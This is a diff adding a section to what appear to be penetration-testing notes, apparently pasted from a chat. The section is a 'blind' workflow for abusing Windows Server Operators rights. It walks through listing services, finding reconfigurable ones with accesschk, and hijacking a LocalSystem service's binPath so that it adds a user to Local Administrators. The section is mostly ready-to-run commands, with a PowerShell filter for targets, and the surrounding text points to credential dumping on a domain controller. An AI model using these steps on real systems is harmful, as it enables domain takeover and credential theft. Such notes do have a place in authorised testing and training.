@@ -250,3 +250,113 @@ Or explain clearly in report: binPath was temporarily modified to demonstrate ex
 🧠 TL;DR:
 Server Operators = full service control + SYSTEM runner.
 Use it to quietly inject yourself into Local Admins on a DC — and from there, secretsdump.py the world.
+
+
+✅ If You’re Going in Blind (No Idea Which Services Are Abusable):
+🧰 Step 1: Enumerate All Services
+Run this first to get a full list of all services (names & descriptions):
+
+cmd
+Copy
+Edit
+sc query state= all
+or the cleaner version:
+
+cmd
+Copy
+Edit
+wmic service get Name,DisplayName,StartMode,State,Status
+This gives you:
+
+The service name (used with sc)
+
+StartMode (look for Manual)
+
+Whether it's currently Running or Stopped
+
+🕵️‍♂️ Step 2: Use accesschk to Find Services You Can Control
+cmd
+Copy
+Edit
+accesschk.exe -uwcqv "BUILTIN\Server Operators" * /accepteula
+🔍 What this does:
+
+-u → user/group (can be your current user too)
+
+-w → check write access
+
+-c → check service configuration
+
+-q → quiet (less noise)
+
+-v → verbose (show the access rights)
+
+This tells you:
+
+What services Server Operators can change the binPath for
+
+Which ones you can start or stop
+
+You’ll get output like:
+
+css
+Copy
+Edit
+[+] SERVICE_NAME
+      RW SERVICE_CHANGE_CONFIG
+      RW SERVICE_START
+      RW SERVICE_STOP
+That’s your golden ticket right there 🎟️
+
+💣 Step 3: Target the Most Boring SYSTEM Service
+Once you spot one that:
+
+✅ Runs as LocalSystem
+✅ Is startable
+✅ You can change config
+
+→ That’s your target for binPath hijack.
+
+Use:
+
+cmd
+Copy
+Edit
+sc qc <service>
+to confirm it runs as LocalSystem
+
+Then:
+
+cmd
+Copy
+Edit
+sc config <service> binPath= "cmd /c net localgroup Administrators <your_user> /add"
+sc start <service>
+🧬 Your Blind Workflow – One-Liner Style
+bash
+Copy
+Edit
+# 1. See services
+sc query state= all
+
+# 2. Find what you can mess with
+accesschk.exe -uwcqv "BUILTIN\Server Operators" * /accepteula
+
+# 3. Confirm it runs as SYSTEM
+sc qc <servicename>
+
+# 4. Abuse it
+sc config <servicename> binPath= "cmd /c net localgroup Administrators buck /add"
+sc start <servicename>
+🔥 BONUS: If You Wanna Be a Savage
+Make it more efficient with PowerShell:
+
+powershell
+Copy
+Edit
+Get-WmiObject win32_service | Where-Object { $_.StartName -eq "LocalSystem" -and $_.StartMode -eq "Manual" } | Select Name, DisplayName
+That gives you only SYSTEM services that are manually startable → perfect for binPath hijacks.
+
+
+
+
